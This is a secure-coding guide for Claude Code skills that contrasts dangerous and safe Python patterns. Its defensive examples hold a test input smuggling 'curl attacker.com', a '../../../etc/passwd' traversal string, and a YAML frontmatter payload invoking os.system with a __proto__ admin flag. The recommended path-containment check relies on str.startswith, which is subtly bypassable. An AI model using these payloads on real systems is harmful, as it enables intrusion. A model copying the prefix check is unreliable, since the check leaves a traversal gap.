# Safe Coding Practices for Skills

Guidelines for creating secure Claude Code skills that pass security scanning.

## Command Execution

### ❌ Dangerous
```python
os.system(user_input)
subprocess.call(f"git clone {repo}", shell=True)
eval(user_data)
exec(code_string)
```

### ✅ Safe
```python
# Use argument lists
subprocess.run(['git', 'clone', repo], timeout=30, check=True)

# Validate inputs
if not re.match(r'^[\w-]+$', repo_name):
    raise ValueError("Invalid repository name")

# Use ast.literal_eval for data
import ast
data = ast.literal_eval(user_string)
```

## Input Validation

### ✅ Always Validate
```python
def process_file(file_path):
    # 1. Check file extension
    if not file_path.endswith(('.txt', '.md')):
        raise ValueError("Invalid file type")
    
    # 2. Resolve to absolute path
    abs_path = Path(file_path).resolve()
    
    # 3. Check it's in allowed directory
    if not str(abs_path).startswith(str(ALLOWED_DIR)):
        raise ValueError("Path outside allowed directory")
    
    # 4. Check file exists and is file
    if not abs_path.is_file():
        raise ValueError("Not a valid file")
    
    return abs_path
```

## Network Operations

### ✅ Document All Network Calls
```markdown
## Network Requirements

This skill makes external requests to:

1. **GitHub API** (api.github.com)
   - Purpose: Fetch repository info
   - Data sent: Repository names
   - Authentication: Optional token

2. **PyPI** (pypi.org)
   - Purpose: Check package versions
   - Data sent: Package name queries
```

### ✅ Use HTTPS with Verification
```python
import requests

response = requests.get(
    'https://api.github.com/repos/user/repo',
    timeout=10,
    verify=True  # SSL certificate verification
)
```

## File Operations

### ✅ Scope to Skill Directory
```python
from pathlib import Path

# Get skill directory
SKILL_DIR = Path(__file__).parent.parent
DATA_DIR = SKILL_DIR / 'data'

def read_template(template_name):
    # Resolve path
    template_path = (DATA_DIR / template_name).resolve()
    
    # Ensure it's within DATA_DIR
    if not str(template_path).startswith(str(DATA_DIR)):
        raise ValueError("Path traversal attempt")
    
    return template_path.read_text()
```

## Import Management

### ✅ Use Correct Package Names
```python
# Correct
import requests
import urllib.parse
import numpy as np
from bs4 import BeautifulSoup

# ❌ Typosquatting
import request   # Missing 's'
import urlib     # Missing 'l'
import numppy    # Extra 'p'
```

### ✅ Document Dependencies
```txt
# requirements.txt
requests==2.31.0
beautifulsoup4==4.12.0
numpy>=1.24.0
```

## YAML Frontmatter

### ✅ Safe Frontmatter
```yaml
---
name: my-skill
description: A safe skill
version: 1.0
dependencies:
  - requests
  - beautifulsoup4
---
```

### ❌ Dangerous Frontmatter
```yaml
---
name: evil-skill
config: !!python/object/apply:os.system ["cmd"]
data: !<tag:yaml.org,2002:python/object>
__proto__:
  isAdmin: true
---
```

## Error Handling

### ✅ Fail Securely
```python
def process_data(data):
    try:
        result = dangerous_operation(data)
        return result
    except Exception as e:
        # Log error, don't expose internals
        logger.error(f"Processing failed: {type(e).__name__}")
        return None  # Fail securely
```

### ❌ Information Disclosure
```python
except Exception as e:
    # Exposes internal paths, stack traces
    return f"Error: {str(e)}\n{traceback.format_exc()}"
```

## Secrets Management

### ✅ Use Environment Variables
```python
import os

API_KEY = os.getenv('MY_SERVICE_API_KEY')
if not API_KEY:
    raise ValueError("API_KEY not set")

response = requests.get(
    'https://api.service.com/data',
    headers={'Authorization': f'Bearer {API_KEY}'}
)
```

### ❌ Hardcoded Secrets
```python
API_KEY = "sk-1234567890abcdefghijklmnopqrstuvwxyz"  # NEVER DO THIS
PASSWORD = "mysecretpassword"  # NEVER DO THIS
```

## Integrity Protection

### ✅ Create MANIFEST.json
```python
import hashlib
import json
from pathlib import Path

def create_manifest(skill_dir):
    manifest = {
        "version": "1.0",
        "checksums": {}
    }
    
    for file in skill_dir.rglob("*"):
        if file.is_file() and file.suffix in ['.py', '.md']:
            rel_path = str(file.relative_to(skill_dir))
            checksum = hashlib.sha256(file.read_bytes()).hexdigest()
            manifest['checksums'][rel_path] = checksum
    
    (skill_dir / 'MANIFEST.json').write_text(json.dumps(manifest, indent=2))
```

## Testing

### ✅ Write Security Tests
```python
def test_input_validation():
    """Test that invalid inputs are rejected"""
    with pytest.raises(ValueError):
        process_file('../../../etc/passwd')
    
    with pytest.raises(ValueError):
        process_file('/tmp/malicious')

def test_no_shell_injection():
    """Test subprocess calls are safe"""
    # Should not accept arbitrary commands
    with pytest.raises(ValueError):
        run_command('ls; curl attacker.com')
```

## Documentation

### ✅ Complete SKILL.md
```markdown
---
name: my-skill
description: Clear description of functionality
version: 1.0
---

# My Skill

## What It Does

[Clear explanation of functionality]

## Security

This skill:
- Does NOT execute arbitrary commands
- Does NOT access files outside its directory
- Does NOT make undocumented network calls
- Validates ALL user inputs

## Network Access

Makes requests to:
1. GitHub API (api.github.com) - for repository info
2. PyPI (pypi.org) - for package versions

## File Access

Accesses only:
- ./data/ (skill data directory)
- ./cache/ (temporary cache)

## Dependencies

See requirements.txt:
- requests (HTTP client)
- beautifulsoup4 (HTML parsing)
```

## Code Review Checklist

Before publishing a skill, verify:

- [ ] No `os.system()`, `eval()`, `exec()`
- [ ] No `subprocess` with `shell=True`
- [ ] All network calls documented in SKILL.md
- [ ] File operations scoped to skill directory
- [ ] Input validation on all user data
- [ ] No hardcoded secrets or API keys
- [ ] Dependencies in requirements.txt
- [ ] YAML frontmatter is safe (no !!python)
- [ ] Error messages don't leak internals
- [ ] MANIFEST.json with checksums
- [ ] Security tests included

## Common Pitfalls

### 1. String Formatting in Commands
```python
# ❌ Vulnerable to injection
cmd = f"git clone {user_repo}"
os.system(cmd)

# ✅ Safe with argument list
subprocess.run(['git', 'clone', user_repo])
```

### 2. Path Traversal
```python
# ❌ Allows ../../../etc/passwd
open(user_file).read()

# ✅ Validates path is within allowed directory
abs_path = Path(user_file).resolve()
if not str(abs_path).startswith(str(ALLOWED_DIR)):
    raise ValueError()
```

### 3. Undocumented Network
```python
# ❌ Mystery endpoint
requests.get('https://unknown-service.com/api')

# ✅ Document in SKILL.md
requests.get('https://github.com/api')  # Documented
```

## Resources

- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)
- [Bandit Security Linter](https://bandit.readthedocs.io/)

## Getting Help

If you're unsure whether your skill is secure:

1. Run the security scanner: `python3 security_scanner.py your-skill/`
2. Review findings and fix CRITICAL/HIGH issues
3. Add security tests
4. Document all external operations
5. Request peer review

---

Remember: **Security is not a feature, it's a requirement.** Take the time to build it in from the start.
